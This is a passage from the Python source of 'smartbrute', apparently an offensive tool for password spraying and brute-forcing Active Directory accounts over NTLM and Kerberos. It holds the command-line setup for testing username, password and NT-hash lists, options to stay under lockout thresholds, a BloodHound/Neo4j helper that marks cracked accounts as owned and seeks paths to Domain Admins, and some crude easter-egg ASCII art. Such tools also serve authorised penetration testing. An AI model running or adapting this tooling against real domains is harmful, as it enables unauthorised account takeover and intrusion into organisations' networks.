            "AllowedToAct",
            "SQLAdmin"
        ]
        # Remove blacklisted edges
        without_edges = [e.lower() for e in self.edge_blacklist]
        effective_edges = [edge for edge in edges if edge.lower() not in without_edges]

        user = self._format_username(username, domain)
        value = None

        with self._driver.session() as session:
            with session.begin_transaction() as tx:
                query = """
                    MATCH (n:User {{name:\"{}\"}}),(m:Group),p=shortestPath((n)-[r:{}*1..]->(m))
                    WHERE m.objectsid ENDS WITH "-512" OR m.objectid ENDS WITH "-512"
                    RETURN COUNT(p) AS pathNb
                    """.format(user, '|'.join(effective_edges))

                self.log.debug("Query : {}".format(query))
                value = tx.run(query).value()
        return ERROR_SUCCESS if value[0] > 0 else ERROR_NO_PATH

    def clean(self):
        if self._driver is not None:
            self._driver.close()
        return ERROR_SUCCESS

    def _run_query(self, query):
        value = None
        with self._driver.session() as session:
            with session.begin_transaction() as tx:
                res = tx.run(query)
                value = res.value()
        return value

    def _get_driver(self):
        try:
            self._driver = GraphDatabase.driver(self._uri, auth=(self.user, self.password))
            return ERROR_SUCCESS
        except AuthError as e:
            self.log.error("Neo4j invalid credentials {}:{}".format(self.user, self.password))
            raise
        except ServiceUnavailable as e:
            self.log.error("Neo4j database unavailable at {}".format(self._uri))
            raise
        except Exception as e:
            self.log.error("An unexpected error occurred while connecting to Neo4J database {} ({}:{})".format(self._uri, self.user, self.password))
            raise

    @staticmethod
    def _format_username(user, domain):
        return (user + "@" + domain).upper()


class Logger(object):
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet
        if verbosity == 3:
            print("༼ つ ◕_◕ ༽つ TAKE MY ENERGY ༼ つ ◕_◕ ༽つ")
            exit(0)
        elif verbosity == 4:
            art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⡟⠉⠉⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⣠⣶⣿⠿⣿⣿⡿⣷⡀⠸⣿⣶⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣆⠀⣠⣾⣿⣿⣿⣶⣿⣿⣶⣿⠁⠀⣠⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣁⣤⣴⣿⠟⠁⠀    What you gonna do bruh ?
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⡟⠉⠉⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁⠀⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⢿⠁⡀⠀⠀⠀⠀⠀⠀⠸⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
            print(art)
            exit(0)
        elif verbosity == 5:
            art = """
🌕🌕🌕🌕🌕🌕🌕🌕🌕
🌕🌕🌕🌕🌕🎩🌕🌕🌕
🌕🌕🌕🌕🌘🌑🌒🌕🌕
🌕🌕🌕🌘🌑🌑🌑🌓🌕
🌕🌕🌖🌑👁🌑👁🌓🌕
🌕🌕🌗🌑🌑👄🌑🌔🌕
🌕🌕🌘🌑🌑🌑🌒🌕🌕
🌕🌕🌘🌑🌑🎀🌓🌕🌕
🌕🌕🌘🌑🌑🌑🌔🌕🌕
🌕🌕🌘🌔🍆🌑🌕🌕🌕
🌕🌖🌒🌕🌗🌒🌕🌕🌕
🌕🌗🌓🌕🌗🌓🌕🌕🌕
🌕🌘🌔🌕🌗🌓🌕🌕🌕
🌕👠🌕🌕🌕👠🌕🌕🌕"""
            print(art)
            exit(0)

        elif verbosity == 6:
            art = """
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
yamete kudasai !!!"""
            print(art)
            exit(0)
        elif verbosity > 6:
            print("Sorry bruh, no more easter eggs")
            exit(0)

    def debug(self, message):
        if self.verbosity == 2:
            console.print("{}[DEBUG]{} {}".format("[yellow3]", "[/yellow3]", message), highlight=False)

    def verbose(self, message):
        if self.verbosity >= 1:
            console.print("{}[VERBOSE]{} {}".format("[blue]", "[/blue]", message), highlight=False)

    def info(self, message):
        if not self.quiet:
            console.print("{}[*]{} {}".format("[bold blue]", "[/bold blue]", message), highlight=False)

    def success(self, message):
        if not self.quiet:
            console.print("{}[+]{} {}".format("[bold green]", "[/bold green]", message), highlight=False)

    def warning(self, message):
        if not self.quiet:
            console.print("{}[-]{} {}".format("[bold orange3]", "[/bold orange3]", message), highlight=False)

    def error(self, message):
        if not self.quiet:
            console.print("{}[!]{} {}".format("[bold red]", "[/bold red]", message), highlight=False)


def print_banner():
    # print("smartbrute.py version %s" % VERSION)
    print("")


def get_options():
    print_banner()
    description = "The smart password spraying and bruteforcing tool for Active Directory Domain Services."

    parser = argparse.ArgumentParser(
        description=description,
        # formatter_class=argparse.RawTextHelpFormatter,
    )

    # defining base arguments (verbosity level, multithreading, ...)
    parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
    parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
    # parser.add_argument("-t", "--threads", dest="threads", action="store", type=int, default=5, required=False, help="number of threads (default: 5)")

    # defining neo4j arguments for setting users as owned for BloodHound
    neo4j_group = parser.add_argument_group("neo4j option")
    neo4j_group.add_argument("--set-as-owned", dest="set_as_owned", action="store_true", help="Set valid users as owned in neo4j")
    neo4j_group.add_argument("-nh", "--neo4j-host", dest="neo4j_host", action="store", default="127.0.0.1", help="neo4j database address (default: 127.0.0.1)")
    neo4j_group.add_argument("-nP", "--neo4j-port", dest="neo4j_port", action="store", default="7687", help="neo4j database port (default:7687)")
    neo4j_group.add_argument("-nu", "--neo4j-user", dest="neo4j_user", action="store", default="neo4j", help="neo4j username (default: neo4j)")
    neo4j_group.add_argument("-np", "--neo4j-password", dest="neo4j_password", action="store", default="neo4j", help="neo4j password (default: neo4j)")

    # defining bruteforce mode arguments
    bruteforce_mode = argparse.ArgumentParser(add_help=False)
    bruteforce_mode.add_argument("--delay", dest="delay", action="store", type=float, default=0, help="number of seconds to wait before each attempt (default: 0)")
    bruteforce_mode.add_argument("--stop-on-success", dest="stop_on_success", action="store_true", help="Stop bruteforcing when a valid authentication goes through")
    bruteforce_mode.add_argument("--no-enumeration", dest="no_enumeration", action="store_true", help="Skip basic LDAP domain dump (used to identify privileged users when a first valid auth is found)")
    bruteforce_mode.add_argument("--line-per-line", dest="line_per_line", action="store_true", default=False, help="given a users file and a passwords/hashes file, do not every each password/hash for every user (user1:password1, user2:password2, ...)")
    bruteforced_creds = bruteforce_mode.add_argument_group("credentials to test")
    bruteforced_users = bruteforced_creds.add_mutually_exclusive_group(required=True)
    bruteforced_users.add_argument("-bu", "--bf-user", dest="bf_user", action="store", help="username to test")
    bruteforced_users.add_argument("-bU", "--bf-users-file", dest="bf_users_file", action="store", help="usernames file to test")
    bruteforced_secrets = bruteforced_creds.add_mutually_exclusive_group(required=True)
    bruteforced_secrets.add_argument("--user-as-password", dest="user_as_password", action="store_true", default=False, help="try the username as password")
    bruteforced_secrets.add_argument("-bp", "--bf-password", dest="bf_password", action="store", help="password to test")
    bruteforced_secrets.add_argument("-bP", "--bf-passwords-file", dest="bf_passwords_file", action="store", help="passwords file to test")
    bruteforced_secrets.add_argument("-bh", "--bf-hash", dest="bf_hash", action="store", help="NT hash (or RC4 Kerberos key) to test")
    bruteforced_secrets.add_argument("-bH", "--bf-hashes-file", dest="bf_hashes_file", action="store", help="NT hashes (or RC4 Kerberos keys) file to test")

    # defining bruteforce mode using NTLM
    bruteforce_mode_ntlm_mode = argparse.ArgumentParser(add_help=False)
    bruteforce_mode_ntlm_mode.add_argument("--dc-ip", dest="dc_ip", action="store", help="domain controller to authenticate to (when using -p/--application-protocol=smb, it can be set to something else than a DC)")
    bruteforce_mode_ntlm_mode.add_argument("-d", "--domain", dest="domain", action="store", help="domain to authenticate to")
    bruteforce_mode_ntlm_mode.add_argument("-p", "--application-protocol", choices=["ldap", "smb"], dest="application_protocol", action="store", help="application layer protocol with which NTLM authentication has to be tried (default: smb)", default="smb")
    bruteforce_mode_ntlm_mode.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")

    # defining bruteforce mode using Kerberos
    bruteforce_mode_kerberos_mode = argparse.ArgumentParser(add_help=False)
    bruteforce_mode_kerberos_mode.add_argument("--kdc-ip", dest="kdc_ip", action="store", help="key distribution center to obtain tickets from")
    bruteforce_mode_kerberos_mode.add_argument("-d", "--domain", dest="domain", action="store", required=True, help="domain to authenticate to")
    bruteforce_mode_kerberos_mode.add_argument("-p", "--transport-protocol", dest="transport_protocol", choices=["udp", "tcp"], default="udp", action="store", help="transport protocol to use (default: udp)")
    bruteforce_mode_kerberos_mode.add_argument("-e", "--etype", dest="etype", action="store", choices=["rc4", "aes128", "aes256"], default="rc4", help="etype to use (default: rc4)")
    bruteforce_mode_kerberos_mode.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")
    bruteforce_mode_kerberos_mode.add_argument('--dc-host', action='store', help='Hostname of the target, can be used if port 445 is blocked or if NTLM is disabled')

    # adding NTLM and Kerberos bruteforcing modes subparsers to the bruteforce mode
    bruteforce_mode_protocols_subparser = bruteforce_mode.add_subparsers(help="this tells what authentication protocol smartbrute has to use when bruteforcing. When choosing kerberos, smartbrute will operate a pre-authentication bruteforce", dest="bruteforced_protocol")
    bruteforce_mode_ntlm_parser = bruteforce_mode_protocols_subparser.add_parser("ntlm", parents=[bruteforce_mode_ntlm_mode], help="attack through NTLM")
    bruteforce_mode_kerberos_parser = bruteforce_mode_protocols_subparser.add_parser("kerberos", parents=[bruteforce_mode_kerberos_mode], help="attack through Kerberos")

    # defining the smart mode arguments
    smart_mode = argparse.ArgumentParser(add_help=False)
    smart_mode.add_argument("-t", "--lockout-threshold", dest="lockout_threshold", action="store", type=int, default=3, required=False, help="number of attempts to leave the user (0 could lockout accounts) (default: 3)")
    smart_mode.add_argument("--delay", dest="delay", action="store", type=int, default=0, help="number of seconds to wait before each attempt (default: 0)")
    smartbruteforced_action = smart_mode.add_mutually_exclusive_group(required=True)
    smartbruteforced_action.add_argument("--users", dest="enum_users", action="store_true", default=False, help="only show users list")
    smartbruteforced_action.add_argument("--policy", dest="enum_policy", action="store_true", default=False, help="only show accounts and passwords policy")
    smartbruteforced_action.add_argument("--user-as-password", dest="user_as_password", action="store_true", default=False, help="try the username as password")
    smartbruteforced_action.add_argument("-bp", "--bf-password", dest="bf_password", action="store", help="password to test")
    smartbruteforced_action.add_argument("-bP", "--bf-passwords-file", dest="bf_passwords_file", action="store", help="passwords file to test")
    smartbruteforced_action.add_argument("-bh", "--bf-hash", dest="bf_hash", action="store", help="NT hash (or RC4 Kerberos key) to test")
    smartbruteforced_action.add_argument("-bH", "--bf-hashes-file", dest="bf_hashes_file", action="store", help="NT hashes (or RC4 Kerberos keys) file to test")
    smartbruteforced_action.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")

    # defining smart mode attacking on the NTLM protocol
    smart_mode_ntlm_mode = argparse.ArgumentParser(add_help=False)
    smart_mode_ntlm_mode.add_argument("--dc-ip", dest="dc_ip", action="store", help="domain controller to authenticate to")
    # smart_mode_ntlm_mode.add_argument("-d", "--domain", dest="domain", action="store", help="domain to authenticate to")
    smart_mode_ntlm_mode.add_argument("-p", "--application-protocol", choices=["ldap", "smb"], dest="application_protocol", action="store", help="application layer protocol with which NTLM authentication has to be tried (default: smb)", default="smb")
    smart_mode_ntlm_mode.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")
    
    # defining smart mode attacking on the Kerberos protocol
    smart_mode_kerberos_mode = argparse.ArgumentParser(add_help=False)
    smart_mode_kerberos_mode.add_argument("--kdc-ip", dest="kdc_ip", action="store", help="key distribution center to obtain tickets from")
    smart_mode_kerberos_mode.add_argument("-p", "--transport-protocol", dest="transport_protocol", choices=["udp", "tcp"], default="udp", action="store", help="transport protocol to use (default: udp)")
    # smart_mode_kerberos_mode.add_argument("-d", "--domain", dest="domain", action="store", help="domain to authenticate to")
    smart_mode_kerberos_mode.add_argument("-e", "--etype", dest="etype", action="store", choices=["rc4", "aes128", "aes256"], default="rc4", help="etype to use (default: rc4)")
    smart_mode_kerberos_mode.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")
    smart_mode_kerberos_mode.add_argument('--dc-host', action='store', help='Hostname of the target, can be used if port 445 is blocked or if NTLM is disabled')

    # defining the smart mode NTLM authentication arguments
    ntlm_auth = argparse.ArgumentParser(add_help=False)
    ntlm_auth.add_argument("--dc-ip", dest="auth_dc_ip", metavar="DC_IP", action="store", help="domain controller to authenticate to")
    ntlm_auth.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", required=True, help="domain to authenticate to")
    ntlm_auth.add_argument("-u", "--auth-user", dest="auth_user", metavar="USER", action="store", required=True, help="user to authenticate with")
    ntlm_secrets = ntlm_auth.add_mutually_exclusive_group(required=True)
    ntlm_secrets.add_argument("-p", "--auth-password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    ntlm_secrets.add_argument("-H", "--auth-hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help="hashes to authenticate with")

    # adding the NTLM and Kerberos target protocol for smart mode attack as subparsers to the NTLM auth protocol
    ntlm_mode_protocols_subparser = ntlm_auth.add_subparsers(help="this tells what authentication protocol smartbrute has to use when bruteforcing. When choosing kerberos, smartbrute will operate a pre-authentication bruteforce", dest="bruteforced_protocol")
    smart_mode_ntlm_parser = ntlm_mode_protocols_subparser.add_parser("ntlm", parents=[smart_mode_ntlm_mode], help="attack through NTLM")
    smart_mode_ntlm_parser = ntlm_mode_protocols_subparser.add_parser("kerberos", parents=[smart_mode_kerberos_mode], help="attack through Kerberos")

    # defining the smart mode Kerberos authentication arguments
    kerberos_auth = argparse.ArgumentParser(add_help=False)
    kerberos_auth.add_argument("--kdc-ip", dest="auth_kdc_ip", metavar="KDC_IP", action="store", help="key distribution center to obtain tickets from")
    kerberos_auth.add_argument("--use-ldaps", dest="auth_use_ldaps", action="store_true", help="Use LDAPS instead of LDAP to query domain information (default: False)")
    kerberos_secrets = kerberos_auth.add_mutually_exclusive_group()
    kerberos_secrets.add_argument("-t", "--ccache-ticket", dest="auth_ccache_ticket", action="store", metavar="/path/to/ticket.ccache", help="path to a .ccache file (kerberos ticket)")
    kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
    kerberos_credentials.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    kerberos_credentials.add_argument("-u", "--user", dest="auth_user", metavar="USER", action="store", help="user to authenticate with")
    kerberos_secret = kerberos_credentials.add_mutually_exclusive_group()
    kerberos_secret.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    kerberos_secret.add_argument("-H", "--hash", dest="auth_rc4_key", metavar="RC4_KEY", action="store", help="RC4 kerberos key (i.e. NT hash) to authenticate with")
    kerberos_secret.add_argument("-k", "--key", dest="auth_aes_key", action="store", metavar="AES_KEY", help="AES128 or AES256 kerberos key to authenticate with (in hex)")

    # adding the NTLM and Kerberos target protocol for smart mode attack as subparsers to the Kerberos auth protocol
    kerberos_mode_protocols_subparser = kerberos_auth.add_subparsers(dest="bruteforced_protocol")
    smart_mode_kerberos_parser = kerberos_mode_protocols_subparser.add_parser("ntlm", parents=[smart_mode_ntlm_mode], help="attack through NTLM")
    smart_mode_kerberos_parser = kerberos_mode_protocols_subparser.add_parser("kerberos", parents=[smart_mode_kerberos_mode], help="attack through Kerberos")

    # adding the NTLM and Kerberos auth protocols subparsers to the smart mode
    mode_subparsers = smart_mode.add_subparsers(help="this is a required argument and tells smartbrute which protocol to use when authenticating to gather information before bruteforcing (like users, policies, ...)", dest="auth_protocol")
    ntlm_parser = mode_subparsers.add_parser("ntlm", parents=[ntlm_auth], help="authenticate through NTLM to gather information")
    kerberos_parser = mode_subparsers.add_parser("kerberos", parents=[kerberos_auth], help="authenticate through Kerberos to gather information")

    # adding the bruteforce and smart subparsers to the base parser
    subparsers = parser.add_subparsers(help="this is a required argument and tells smartbrute in which mode to run. smart mode will enumerate users and policies and avoid locking out accounts given valid domain credentials. brute mode is dumb and only bruteforces.", dest="running_mode")
    bruteforce_parser = subparsers.add_parser("brute", parents=[bruteforce_mode], help="bruteforce mode")
    smart_parser = subparsers.add_parser("smart", parents=[smart_mode], help="smart mode")

    options = parser.parse_args()


    # print(parser.parse_args())
    if options.running_mode is None:
        print("error: please choose between smart and brute for running mode. This has to be supplied as a positional argument (i.e. smartbrute.py smart)")
        parser.print_help()
        exit(0)
    if options.running_mode == "brute" and options.bruteforced_protocol is None:
        print("error: please choose between ntlm and kerberos for bruteforce mode. This has to be supplied as a positional argument (i.e. smartbrute.py brute [options] ntlm [options])")
        bruteforce_parser.print_help()
        exit(0)
    if options.running_mode == "smart" and options.auth_protocol is None:
        print("error: please choose between ntlm and kerberos for authentication protocol when using the smart mode. This has to be supplied as a positional argument (i.e. smartbrute.py smart [options] ntlm [options])")
        smart_parser.print_help()
        exit(0)
    if options.running_mode == "smart" and options.enum_users == False and options.enum_policy == False and options.bruteforced_protocol is None:
        print("error: either set --users or --policy or choose a bruteforced protocol (ntlm or kerberos) as positional argument (i.e. smartbrute.py smart --users [options] ntlm [options], or smartbrute.py smart [options] ntlm [options] ntlm)")
        smart_parser.print_help()
        exit(0)
    if (options.running_mode == "brute" and options.bruteforced_protocol == "ntlm") and options.dc_ip is None and options.domain is None:
        bruteforce_mode_ntlm_mode.error("one of the arguments -d/--domain --dc-ip is required")
    if (options.running_mode == "brute" and options.line_per_line == True) and (options.bf_users_file is None or (options.bf_passwords_file is None and options.bf_hashes_file is None)):
        bruteforce_mode.error("with --line-per-line, argument -bU/--bf-users-file is required and one of the arguments -bP/--bf-passwords-file -bH/--bf-hashes-file is required")

    if options.running_mode == "smart" and options.auth_protocol == "kerberos" and options.auth_ccache_ticket is None and (options.auth_domain is None or options.auth_user is None or (options.auth_password is None and options.auth_aes_key is None and options.auth_rc4_key is None)):
        print("error: either set -t/--ccache-ticket or (-d/--domain with -u/--user with (-p/--password or -H/--hash or -k/--aes-key))")
        kerberos_parser.print_help()
        exit(0)

    if options.running_mode == "smart" and options.auth_protocol == "kerberos" and options.auth_domain is not None and "." not in options.auth_domain:
        print("error: FQDN domain is needed")
        kerberos_parser.print_help()
        exit(0)

    if options.bruteforced_protocol == "kerberos":
        if (options.bf_hash is not None or options.bf_hashes_file is not None) and options.etype != "rc4":
            print("error: -e/--etype was set to aes128 or aes256 but a RC4 key (or set of) was supplied with -bh/-bH, this doesn't make sense. Resuming the bruteforce with RC4 etype.")
            kerberos_parser.print_help()
            exit(0)

    return options


def main(options, logger, console, neo4j):

    # if options.running_mode == "smart" and (options.bruteforced_protocol == "ntlm" or options.bruteforced_protocol == "kerberos") and options.domain is None:
    #     logger.verbose("No bruteforced domain was set, using the same as the one used for authentication")
    #     options.domain = options.auth_domain

    secret = None
    if options.bf_password is not None or options.bf_passwords_file is not None:
        secret = "password"
        logger.info("Starting bruteforce attack on passwords")
    elif options.bf_hash is not None or options.bf_hashes_file is not None:
        if options.bruteforced_protocol == "ntlm":
            secret = "NT hash"
            logger.info("Starting bruteforce attack on NT hashes")
        elif options.bruteforced_protocol == "kerberos":
            secret = "RC4 key"
            logger.info("Starting bruteforce attack on RC4 keys")
    else:
        if options.user_as_password:
            secret = "password"
        # elif options.bruteforced_protocol == "ntlm":
        #     logger.error("No password (or list of passwords, or hashes) was supplied, there is nothing to be done")
        #     exit(0)
        # elif options.bruteforced_protocol == "kerberos":
        #     logger.error("No password (or list of passwords, or hashes) was supplied, there is nothing to be done")
        #     exit(0)

    table = Table(
        show_header=True,
        header_style="bold blue",
        border_style="grey35",
        caption_style="",
        caption_justify="left",
        box=box.SQUARE
    )

    with Live(Columns((table,), expand=True), console=console, refresh_per_second=10, vertical_overflow="ellipsis"):
        table.add_column("domain")
        table.add_column("user")
        if options.running_mode == "smart":
            if options.enum_policy:
                table.add_column("granular lockout threshold")
        if secret is not None:
            table.add_column(secret)
            table.add_column("details")
        bf = bruteforce(options, table, neo4j)
        if options.running_mode == "brute":
            bf.bruteforce_attack()
        elif options.running_mode == "smart":
            bf.smart_attack()
        table.caption = None


if __name__ == "__main__":
    try:
        options = get_options()
        logger = Logger(options.verbosity, options.quiet)
        console = Console()
        neo4j = None
        if options.set_as_owned == True:
            neo4j_options = Neo4jConnection.Options(options.neo4j_host, options.neo4j_user, options.neo4j_password, options.neo4j_port, logger)
            neo4j = Neo4jConnection(neo4j_options)
            neo4j._get_driver()
            try:
                neo4j._run_query("MATCH p=(n) RETURN p")
            except AuthError as e:
                logger.error("Error when connecting to the neo4j database, check the credentials")
                exit(0)
            except Exception as e:
                logger.error("Other error occured: %s" % e)
                exit(0)
        main(options, logger, console, neo4j)
        print()
    except KeyboardInterrupt:
        logger.info("Terminating script...")
        raise SystemExit
